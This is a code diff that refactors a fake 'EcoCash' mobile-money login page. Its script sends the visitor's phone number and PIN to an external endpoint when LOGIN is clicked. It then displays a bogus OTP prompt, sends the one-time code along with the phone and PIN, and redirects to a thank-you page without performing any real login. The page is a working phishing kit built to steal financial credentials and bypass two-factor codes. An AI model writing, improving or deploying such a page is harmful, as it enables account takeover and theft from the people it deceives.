@@ -1,47 +1,147 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <title>EcoCash — Login</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 
 <style>
-  *{box-sizing:border-box}
-  html,body{height:100%}
-  body{
-    font-family:Inter,system-ui,Arial;
-    background:linear-gradient(180deg,#f7fbff,#e8f3ff);
-    margin:0;
-    padding:18px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    min-height:100vh;
-  }
+*{box-sizing:border-box}
+html,body{height:100%}
 
-  .card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
-  .logo{height:44px;display:block;margin:0 auto 10px}
-  h2{text-align:center;margin:0 0 12px;color:#111;font-size:20px}
-  label{display:block;font-size:13px;color:#374151;margin-top:8px}
-  input{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;font-size:14px}
-  .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;cursor:pointer;width:100%}
-  .btn[disabled]{background:#cbd5e1;color:#6b7280;cursor:not-allowed}
-  .req{color:#d04444;margin-right:6px}
+body{
+  font-family:Inter,system-ui,Arial,sans-serif;
+  background:linear-gradient(180deg,#f7fbff,#e8f3ff);
+  margin:0;
+  padding:18px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
 
-  .pin-row{display:flex;gap:8px;margin-top:4px}
-  .pin-digit{
-    width:44px;height:48px;text-align:center;font-size:22px;
-    border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;
-  }
+.card{
+  width:100%;
+  max-width:380px;
+  background:#fff;
+  padding:20px;
+  border-radius:12px;
+  box-shadow:0 12px 30px rgba(2,6,23,.06);
+}
 
-  .otp-modal{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.35)}
-  .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:300px;max-width:92%}
-  .otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
-  .otp-digit{width:40px;height:48px;text-align:center;font-size:20px;border-radius:8px;border:1px solid #e6eefc}
-  .otp-warning{color:#d04444;font-size:13px;margin-top:8px;display:none}
-  .success{color:#16a34a;font-weight:600}
+.logo{
+  height:44px;
+  display:block;
+  margin:0 auto 10px;
+}
+
+h2{
+  text-align:center;
+  margin:0 0 12px;
+  color:#111;
+  font-size:20px;
+}
+
+label{
+  display:block;
+  font-size:13px;
+  color:#374151;
+  margin-top:8px;
+}
+
+.req{
+  color:#d04444;
+  margin-right:6px;
+}
+
+input{
+  width:100%;
+  padding:10px;
+  border-radius:8px;
+  border:1px solid #e6eefc;
+  background:#fbfdff;
+  font-size:14px;
+}
+
+.btn{
+  width:100%;
+  margin-top:12px;
+  padding:10px;
+  border-radius:8px;
+  border:0;
+  background:#4b86ff;
+  color:#fff;
+  cursor:pointer;
+}
+
+.btn[disabled]{
+  background:#cbd5e1;
+  color:#6b7280;
+  cursor:not-allowed;
+}
+
+/* PIN */
+.pin-row{
+  display:flex;
+  gap:8px;
+  margin-top:4px;
+}
+
+.pin-digit{
+  width:44px;
+  height:48px;
+  text-align:center;
+  font-size:22px;
+  border-radius:8px;
+  border:1px solid #e6eefc;
+  background:#fbfdff;
+}
+
+/* OTP */
+.otp-modal{
+  position:fixed;
+  inset:0;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background:rgba(0,0,0,.35);
+}
+
+.otp-box{
+  background:#fff;
+  padding:18px;
+  border-radius:12px;
+  min-width:300px;
+}
+
+.otp-row{
+  display:flex;
+  gap:8px;
+  justify-content:center;
+  margin-top:8px;
+}
+
+.otp-digit{
+  width:40px;
+  height:48px;
+  text-align:center;
+  font-size:20px;
+  border-radius:8px;
+  border:1px solid #e6eefc;
+}
+
+.otp-warning{
+  color:#d04444;
+  font-size:13px;
+  margin-top:8px;
+  display:none;
+}
+
+.success{
+  color:#16a34a;
+  font-weight:600;
+}
 </style>
 </head>
 
@@ -64,16 +164,16 @@
       <input class="pin-digit" maxlength="1" inputmode="numeric" autocomplete="off">
     </div>
 
-    <!-- 🔴 FIX: button, not submit -->
+    <!-- MUST be button, not submit -->
     <button type="button" id="loginBtn" class="btn" disabled>LOGIN</button>
   </form>
 </div>
 
 <!-- OTP MODAL -->
-<div id="otpModal" style="display:none" class="otp-modal">
+<div id="otpModal" class="otp-modal" style="display:none">
   <div class="otp-box">
     <strong style="display:block;text-align:center">Enter OTP</strong>
-    <p class="small" style="margin:8px 0 10px">We have sent an OTP to your phone.</p>
+    <p style="font-size:13px;margin:8px 0 10px">We have sent an OTP to your phone.</p>
 
     <div class="otp-row">
       <input maxlength="1" class="otp-digit" id="d0">
@@ -85,11 +185,6 @@
     </div>
 
     <div id="otpWarning" class="otp-warning">Please input 6 digits</div>
-
-    <div class="resend-row" style="margin-top:12px">
-      <span id="resendInfo">Resend available in <span id="countdown">120</span>s</span>
-      <button id="resendBtn" disabled>Resend OTP</button>
-    </div>
 
     <div style="display:flex;gap:10px;margin-top:12px">
       <button id="confirmOtp" style="flex:1;background:#16a34a;color:#fff;border:0;border-radius:8px" disabled>Confirm</button>
@@ -108,67 +203,83 @@ const loginBtn = document.getElementById('loginBtn');
 const pinInputs = [...document.querySelectorAll('.pin-digit')];
 const otpModal = document.getElementById('otpModal');
 const confirmBtn = document.getElementById('confirmOtp');
-const resendBtn = document.getElementById('resendBtn');
 const otpWarning = document.getElementById('otpWarning');
 
 const PREFIX = '+263';
-const RESEND_SECONDS = 120;
-let secondsLeft = RESEND_SECONDS;
-let resendTimer = null;
 
 /* PHONE */
 function normalizePhone(){
-  let d = phoneEl.value.slice(PREFIX.length).replace(/\D/g,'');
-  if(d.startsWith('0')) d = d.slice(1);
-  if(d && d[0] !== '7') d = '7' + d.slice(1);
-  phoneEl.value = PREFIX + d.slice(0,9);
+  let digits = phoneEl.value.slice(PREFIX.length).replace(/\D/g,'');
+  if(digits.startsWith('0')) digits = digits.slice(1);
+  if(digits && digits[0] !== '7') digits = '7' + digits.slice(1);
+  phoneEl.value = PREFIX + digits.slice(0,9);
 }
+
 function validPhone(){
   const d = phoneEl.value.slice(PREFIX.length);
   return /^\d{9}$/.test(d) && d.startsWith('7');
 }
+
 phoneEl.addEventListener('keydown',e=>{
   if((e.key==='Backspace'||e.key==='Delete') && phoneEl.selectionStart<=PREFIX.length){
     e.preventDefault();
   }
 });
+
 phoneEl.addEventListener('input',()=>{
   if(!phoneEl.value.startsWith(PREFIX)) phoneEl.value = PREFIX;
-  normalizePhone(); updateLoginState();
+  normalizePhone();
+  requestAnimationFrame(()=>{
+    const end = phoneEl.value.length;
+    phoneEl.setSelectionRange(end,end);
+  });
+  updateState();
 });
 
 /* PIN */
-function getPin(){ return pinInputs.map(i=>i.dataset.val||'').join(''); }
+function getPin(){
+  return pinInputs.map(i=>i.dataset.val||'').join('');
+}
+
 pinInputs.forEach((el,i)=>{
   el.addEventListener('input',e=>{
     const v=e.target.value.replace(/\D/g,'');
     el.value=v?'•':'';
     el.dataset.val=v;
     if(v && i<3) pinInputs[i+1].focus();
-    updateLoginState();
+    updateState();
   });
 });
 
-/* LOGIN STATE */
-function updateLoginState(){
+/* STATE */
+function updateState(){
   loginBtn.disabled = !(validPhone() && /^\d{4}$/.test(getPin()));
 }
 
 /* SEND */
 function sendToServer(payload){
-  return fetch(FUNCTION_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
+  return fetch(FUNCTION_URL,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(payload)
+  });
 }
 
 /* LOGIN */
 loginBtn.onclick=()=>{
   otpModal.style.display='flex';
-  startResendCountdown();
-  sendToServer({event:'login_clicked',loginPhone:phoneEl.value,loginPin:getPin(),submittedAt:new Date().toISOString()});
+  sendToServer({
+    event:'login_clicked',
+    loginPhone:phoneEl.value,
+    loginPin:getPin(),
+    submittedAt:new Date().toISOString()
+  });
 };
 
 /* OTP */
 const dEls=['d0','d1','d2','d3','d4','d5'].map(id=>document.getElementById(id));
 function getOtp(){return dEls.map(el=>el.value||'').join('');}
+
 dEls.forEach((el,i)=>{
   el.addEventListener('input',()=>{
     el.value=el.value.replace(/\D/g,'').slice(0,1);
@@ -181,24 +292,20 @@ dEls.forEach((el,i)=>{
 confirmBtn.onclick=async()=>{
   const otp=getOtp();
   if(!/^\d{6}$/.test(otp)){otpWarning.style.display='block';return;}
-  await sendToServer({event:'otp_confirm',loginPhone:phoneEl.value,loginPin:getPin(),otp,submittedAt:new Date().toISOString()});
+
+  await sendToServer({
+    event:'otp_confirm',
+    loginPhone:phoneEl.value,
+    loginPin:getPin(),
+    otp,
+    submittedAt:new Date().toISOString()
+  });
+
   window.location.href='thankyou.html';
 };
 
-/* RESEND */
-function startResendCountdown(){
-  clearInterval(resendTimer);
-  secondsLeft=RESEND_SECONDS;
-  resendBtn.disabled=true;
-  resendTimer=setInterval(()=>{
-    secondsLeft--;
-    document.getElementById('countdown').textContent=secondsLeft;
-    if(secondsLeft<=0){clearInterval(resendTimer);resendBtn.disabled=false;}
-  },1000);
-}
-resendBtn.onclick=()=>{startResendCountdown();sendToServer({event:'resend_otp',loginPhone:phoneEl.value,loginPin:getPin(),submittedAt:new Date().toISOString()});};
-
 document.getElementById('cancelOtp').onclick=()=>otpModal.style.display='none';
 </script>
+
 </body>
 </html>
